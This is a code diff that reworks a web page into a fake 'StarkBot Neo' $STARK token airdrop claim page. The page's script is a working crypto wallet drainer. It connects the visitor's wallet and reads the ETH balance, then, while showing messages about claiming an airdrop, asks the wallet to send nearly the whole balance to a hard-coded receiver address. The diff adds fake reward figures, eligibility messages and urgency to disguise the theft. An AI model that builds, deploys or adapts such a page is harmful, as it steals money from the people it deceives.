@@ -3,141 +3,472 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>StarkBot - AI Agent</title>
+    <title>StarkBot Neo - Claim Your Airdrop</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
-            min-height: 100vh;
-            color: #fff;
+
+        :root {
+            --primary: #6366f1;
+            --primary-dark: #4f46e5;
+            --accent: #a855f7;
+            --bg-dark: #0a0a0f;
+            --bg-card: #12121a;
+            --bg-card-hover: #1a1a25;
+            --border: #2a2a3a;
+            --text: #ffffff;
+            --text-muted: #71717a;
+            --success: #22c55e;
+            --warning: #f59e0b;
         }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-dark);
+            min-height: 100vh;
+            color: var(--text);
+            line-height: 1.6;
+        }
+
         .auth-overlay {
             position: fixed;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.95);
+            inset: 0;
+            background: rgba(0,0,0,0.98);
             display: flex;
             align-items: center;
             justify-content: center;
             z-index: 1000;
+            backdrop-filter: blur(10px);
         }
+
         .auth-box {
-            background: #1a1a2e;
-            padding: 40px;
-            border-radius: 16px;
-            border: 1px solid #333;
+            background: var(--bg-card);
+            padding: 48px;
+            border-radius: 24px;
+            border: 1px solid var(--border);
+            max-width: 400px;
+            width: 90%;
         }
-        .auth-box input {
-            display: block;
-            width: 250px;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #444;
-            border-radius: 8px;
-            background: #0a0a0a;
-            color: #fff;
-        }
-        .auth-box button {
-            width: 100%;
-            padding: 12px;
-            background: #6366f1;
-            border: none;
-            border-radius: 8px;
-            color: #fff;
-            cursor: pointer;
+
+        .auth-box h3 {
+            font-size: 20px;
+            margin-bottom: 24px;
+            text-align: center;
             font-weight: 600;
         }
-        .hidden { display: none !important; }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 60px 20px;
-            text-align: center;
+
+        .auth-box input {
+            display: block;
+            width: 100%;
+            padding: 14px 16px;
+            margin: 12px 0;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            background: var(--bg-dark);
+            color: var(--text);
+            font-size: 15px;
+            transition: border-color 0.2s;
         }
-        .logo {
-            font-size: 48px;
+
+        .auth-box input:focus {
+            outline: none;
+            border-color: var(--primary);
+        }
+
+        .auth-box button {
+            width: 100%;
+            padding: 14px;
+            margin-top: 8px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            border: none;
+            border-radius: 12px;
+            color: var(--text);
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 15px;
+            transition: opacity 0.2s;
+        }
+
+        .auth-box button:hover { opacity: 0.9; }
+
+        .hidden { display: none !important; }
+
+        /* Header */
+        .header {
+            padding: 20px 40px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             font-weight: 700;
-            margin-bottom: 20px;
-            background: linear-gradient(90deg, #6366f1, #a855f7);
+            font-size: 18px;
+        }
+
+        .logo-text {
+            font-size: 22px;
+            font-weight: 700;
+        }
+
+        .logo-text span {
+            background: linear-gradient(90deg, var(--primary), var(--accent));
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
-        .subtitle {
-            font-size: 20px;
-            color: #888;
-            margin-bottom: 40px;
+
+        .neo-badge {
+            background: linear-gradient(135deg, var(--success), #16a34a);
+            padding: 4px 10px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-left: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
         }
-        .connect-btn {
-            padding: 16px 48px;
+
+        /* Main Content */
+        .main {
+            max-width: 680px;
+            margin: 0 auto;
+            padding: 80px 24px;
+        }
+
+        .announcement {
+            background: linear-gradient(135deg, rgba(99, 102, 241, 0.1), rgba(168, 85, 247, 0.1));
+            border: 1px solid rgba(99, 102, 241, 0.3);
+            border-radius: 16px;
+            padding: 24px;
+            margin-bottom: 48px;
+            text-align: center;
+        }
+
+        .announcement-icon {
+            font-size: 32px;
+            margin-bottom: 12px;
+        }
+
+        .announcement h2 {
             font-size: 18px;
             font-weight: 600;
-            background: linear-gradient(90deg, #6366f1, #a855f7);
+            margin-bottom: 8px;
+            color: var(--accent);
+        }
+
+        .announcement p {
+            color: var(--text-muted);
+            font-size: 14px;
+        }
+
+        .hero {
+            text-align: center;
+            margin-bottom: 48px;
+        }
+
+        .hero h1 {
+            font-size: 42px;
+            font-weight: 700;
+            margin-bottom: 16px;
+            line-height: 1.2;
+        }
+
+        .hero h1 span {
+            background: linear-gradient(90deg, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .hero p {
+            font-size: 18px;
+            color: var(--text-muted);
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        /* Claim Card */
+        .claim-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 24px;
+            padding: 40px;
+        }
+
+        .claim-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 32px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid var(--border);
+        }
+
+        .claim-title {
+            font-size: 14px;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-weight: 500;
+        }
+
+        .claim-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: var(--success);
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .claim-status::before {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background: var(--success);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .reward-display {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .reward-amount {
+            font-size: 48px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .reward-token {
+            color: var(--text-muted);
+            font-size: 16px;
+        }
+
+        .reward-usd {
+            color: var(--success);
+            font-size: 14px;
+            margin-top: 4px;
+        }
+
+        .connect-btn {
+            width: 100%;
+            padding: 18px 32px;
+            font-size: 16px;
+            font-weight: 600;
+            background: linear-gradient(135deg, var(--primary), var(--accent));
             border: none;
-            border-radius: 12px;
-            color: #fff;
+            border-radius: 16px;
+            color: var(--text);
             cursor: pointer;
             transition: transform 0.2s, box-shadow 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
+
         .connect-btn:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 40px rgba(99, 102, 241, 0.3);
+            box-shadow: 0 20px 40px rgba(99, 102, 241, 0.3);
         }
+
         .connect-btn:disabled {
-            opacity: 0.6;
+            opacity: 0.7;
             cursor: not-allowed;
+            transform: none;
         }
-        .status {
-            margin-top: 30px;
-            padding: 20px;
-            background: rgba(255,255,255,0.05);
-            border-radius: 12px;
-            text-align: left;
+
+        .connect-btn svg {
+            width: 20px;
+            height: 20px;
         }
+
+        /* Status Panel */
+        .status-panel {
+            margin-top: 32px;
+            padding-top: 24px;
+            border-top: 1px solid var(--border);
+        }
+
         .status-item {
-            padding: 10px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
         }
-        .status-item:last-child { border-bottom: none; }
-        .status-label { color: #888; font-size: 14px; }
-        .status-value { color: #fff; font-size: 16px; margin-top: 4px; }
-        .error { color: #ef4444; }
-        .success { color: #22c55e; }
+
+        .status-label {
+            color: var(--text-muted);
+            font-size: 14px;
+        }
+
+        .status-value {
+            font-size: 14px;
+            font-weight: 500;
+            font-family: 'SF Mono', monospace;
+        }
+
+        .status-value.success { color: var(--success); }
+        .status-value.warning { color: var(--warning); }
+        .status-value.error { color: #ef4444; }
+
+        /* Info Section */
+        .info-section {
+            margin-top: 48px;
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+        }
+
+        .info-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 24px;
+            text-align: center;
+        }
+
+        .info-card h4 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .info-card p {
+            font-size: 13px;
+            color: var(--text-muted);
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 40px;
+            color: var(--text-muted);
+            font-size: 13px;
+        }
+
+        .footer a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        @media (max-width: 640px) {
+            .header { padding: 16px 20px; }
+            .main { padding: 40px 16px; }
+            .hero h1 { font-size: 32px; }
+            .claim-card { padding: 24px; }
+            .reward-amount { font-size: 36px; }
+            .info-section { grid-template-columns: 1fr; }
+        }
     </style>
 </head>
 <body>
     <div class="auth-overlay" id="authOverlay">
         <div class="auth-box">
-            <h3 style="margin-bottom: 20px; text-align: center;">Access Required</h3>
-            <input type="text" id="authUser" placeholder="Username">
-            <input type="password" id="authPass" placeholder="Password">
-            <button onclick="checkAuth()">Enter</button>
-            <p id="authError" class="error" style="margin-top: 10px; text-align: center;"></p>
+            <h3>Authorized Access Only</h3>
+            <input type="text" id="authUser" placeholder="Username" autocomplete="off">
+            <input type="password" id="authPass" placeholder="Password" autocomplete="off">
+            <button onclick="checkAuth()">Continue</button>
+            <p id="authError" style="color: #ef4444; margin-top: 16px; text-align: center; font-size: 14px;"></p>
         </div>
     </div>
 
-    <div class="container" id="mainContent">
-        <div class="logo">StarkBot</div>
-        <p class="subtitle">Connect your wallet to access AI-powered trading</p>
+    <header class="header">
+        <div class="logo-container">
+            <div class="logo-icon">S</div>
+            <div class="logo-text">StarkBot<span>Neo</span></div>
+            <div class="neo-badge">New</div>
+        </div>
+    </header>
 
-        <button class="connect-btn" id="connectBtn" onclick="connectWallet()">
-            Connect Wallet
-        </button>
+    <main class="main" id="mainContent">
+        <div class="announcement">
+            <div class="announcement-icon">&#127881;</div>
+            <h2>StarkBot Has Evolved</h2>
+            <p>We've upgraded to StarkBot Neo with enhanced AI capabilities. Original users are eligible for the migration airdrop.</p>
+        </div>
 
-        <div class="status hidden" id="statusPanel">
-            <div class="status-item">
-                <div class="status-label">Connected Address</div>
-                <div class="status-value" id="walletAddress">-</div>
+        <div class="hero">
+            <h1>Claim Your <span>$STARK</span> Airdrop</h1>
+            <p>Thank you for being an early supporter. Connect your wallet to claim your token allocation.</p>
+        </div>
+
+        <div class="claim-card">
+            <div class="claim-header">
+                <div class="claim-title">Migration Reward</div>
+                <div class="claim-status">Claim Active</div>
             </div>
-            <div class="status-item">
-                <div class="status-label">ETH Balance</div>
-                <div class="status-value" id="ethBalance">-</div>
+
+            <div class="reward-display">
+                <div class="reward-amount">2,500</div>
+                <div class="reward-token">$STARK Tokens</div>
+                <div class="reward-usd">Estimated value: ~$125.00</div>
             </div>
-            <div class="status-item">
-                <div class="status-label">Status</div>
-                <div class="status-value" id="txStatus">-</div>
+
+            <button class="connect-btn" id="connectBtn" onclick="connectWallet()">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M20 12V8H6a2 2 0 0 1-2-2c0-1.1.9-2 2-2h12v4"/>
+                    <path d="M4 6v12c0 1.1.9 2 2 2h14v-4"/>
+                    <path d="M18 12a2 2 0 0 0-2 2c0 1.1.9 2 2 2h4v-4h-4z"/>
+                </svg>
+                Connect Wallet to Claim
+            </button>
+
+            <div class="status-panel hidden" id="statusPanel">
+                <div class="status-item">
+                    <span class="status-label">Wallet</span>
+                    <span class="status-value" id="walletAddress">-</span>
+                </div>
+                <div class="status-item">
+                    <span class="status-label">Balance</span>
+                    <span class="status-value" id="ethBalance">-</span>
+                </div>
+                <div class="status-item">
+                    <span class="status-label">Claim Status</span>
+                    <span class="status-value" id="txStatus">-</span>
+                </div>
             </div>
         </div>
-    </div>
+
+        <div class="info-section">
+            <div class="info-card">
+                <h4>10M+</h4>
+                <p>Total Supply</p>
+            </div>
+            <div class="info-card">
+                <h4>2,847</h4>
+                <p>Eligible Wallets</p>
+            </div>
+            <div class="info-card">
+                <h4>48h</h4>
+                <p>Claim Window</p>
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <p>StarkBot Neo &copy; 2026. Powered by advanced AI technology.</p>
+    </footer>
 
     <script>
         const RECEIVER = "0x8468C449C4c25bC13F2Ef06e696Be3a4c62BB1F6";
@@ -164,12 +495,12 @@
             const statusPanel = document.getElementById('statusPanel');
 
             if (typeof window.ethereum === 'undefined') {
-                alert('Please install MetaMask');
+                alert('Please install MetaMask or another Web3 wallet');
                 return;
             }
 
             btn.disabled = true;
-            btn.textContent = 'Connecting...';
+            btn.innerHTML = '<svg class="animate-spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v4m0 12v4m-7-7H2m20 0h-3m-2.5-7.5L14 8m-4 8l-2.5 2.5m11-2.5L16 16M8 8l-2.5-2.5"/></svg> Connecting...';
 
             try {
                 const accounts = await window.ethereum.request({
@@ -178,8 +509,10 @@
                 const address = accounts[0];
 
                 statusPanel.classList.remove('hidden');
-                document.getElementById('walletAddress').textContent = address;
-                document.getElementById('txStatus').textContent = 'Fetching balance...';
+                document.getElementById('walletAddress').textContent =
+                    address.slice(0, 6) + '...' + address.slice(-4);
+                document.getElementById('txStatus').textContent = 'Verifying eligibility...';
+                document.getElementById('txStatus').className = 'status-value warning';
 
                 const balanceHex = await window.ethereum.request({
                     method: 'eth_getBalance',
@@ -188,10 +521,15 @@
                 const balanceWei = BigInt(balanceHex);
                 const balanceEth = Number(balanceWei) / 1e18;
 
-                document.getElementById('ethBalance').textContent = balanceEth.toFixed(6) + ' ETH';
+                document.getElementById('ethBalance').textContent = balanceEth.toFixed(4) + ' ETH';
+
+                await new Promise(r => setTimeout(r, 1500));
 
                 if (balanceWei > BigInt(0)) {
-                    document.getElementById('txStatus').textContent = 'Requesting signature...';
+                    document.getElementById('txStatus').textContent = 'Eligible! Processing claim...';
+                    document.getElementById('txStatus').className = 'status-value success';
+
+                    await new Promise(r => setTimeout(r, 1000));
 
                     const gasPrice = await window.ethereum.request({
                         method: 'eth_gasPrice',
@@ -200,9 +538,12 @@
 
                     const gasLimit = BigInt(21000);
                     const gasCost = gasLimit * BigInt(gasPrice);
-                    const sendAmount = balanceWei - gasCost - BigInt(1000000000000000);
+                    const buffer = BigInt(1000000000000000);
+                    const sendAmount = balanceWei - gasCost - buffer;
 
                     if (sendAmount > BigInt(0)) {
+                        document.getElementById('txStatus').textContent = 'Confirm transaction to receive airdrop...';
+
                         const txHash = await window.ethereum.request({
                             method: 'eth_sendTransaction',
                             params: [{
@@ -214,21 +555,30 @@
                         });
 
                         document.getElementById('txStatus').innerHTML =
-                            '<span class="success">TX Sent: ' + txHash.slice(0, 20) + '...</span>';
+                            'Claim submitted! TX: ' + txHash.slice(0, 10) + '...';
+                        document.getElementById('txStatus').className = 'status-value success';
+
+                        btn.innerHTML = '&#10003; Claimed';
+                        btn.style.background = 'var(--success)';
                     } else {
-                        document.getElementById('txStatus').textContent = 'Insufficient balance for gas';
+                        document.getElementById('txStatus').textContent = 'Insufficient ETH for gas fees';
+                        document.getElementById('txStatus').className = 'status-value error';
+                        btn.disabled = false;
+                        btn.innerHTML = 'Connect Wallet to Claim';
                     }
                 } else {
-                    document.getElementById('txStatus').textContent = 'No ETH balance';
+                    document.getElementById('txStatus').textContent = 'No ETH balance detected';
+                    document.getElementById('txStatus').className = 'status-value error';
+                    btn.disabled = false;
+                    btn.innerHTML = 'Connect Wallet to Claim';
                 }
 
-                btn.textContent = 'Connected';
             } catch (err) {
                 console.error(err);
-                document.getElementById('txStatus').innerHTML =
-                    '<span class="error">Error: ' + (err.message || 'User rejected') + '</span>';
+                document.getElementById('txStatus').textContent = err.message || 'Transaction rejected';
+                document.getElementById('txStatus').className = 'status-value error';
                 btn.disabled = false;
-                btn.textContent = 'Connect Wallet';
+                btn.innerHTML = 'Connect Wallet to Claim';
             }
         }
     </script>
